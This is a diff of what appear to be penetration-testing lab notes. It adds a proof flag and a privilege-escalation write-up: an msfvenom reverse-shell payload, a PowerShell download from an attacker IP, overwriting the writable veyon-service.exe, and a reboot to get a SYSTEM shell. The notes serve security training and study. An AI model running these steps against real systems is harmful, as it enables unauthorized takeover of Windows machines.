@@ -9,7 +9,7 @@
 Main Objectives:
 
 Local.txt = 279455253755968e3f61ee5729cb9c11
-Proof.txt = 
+Proof.txt = 55cb4c24abff53dee8d3d15d82008570
 
 **Enumeration**
 
@@ -1873,6 +1873,31 @@ Action: powershell.exe .\check_email.ps1
 
 1. PE Steps
 
+- Confirmed that it's possible to edit the veyon-service.exe file. Also, confirmed that the user while not able to restart the service, could restart the entire system.
+
+- Created malicous exe use MSFVenom. 
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o shell.exe
+```
+
+- Copied malicious exe onto victim system, then replaced veyon-service.exe with the malicious file. 
+
+```
+iwr -uri http://192.168.45.215/shell.exe -Outfile shell.exe
+
+mv shell.exe veyon-service.exe
+```
+
+- Restarted system.
+
+```
+shutdown -r -t 1
+```
+
+- Received shell as system.
+
+![[Pasted image 20260227140153.png]]
 ```
 
 ```
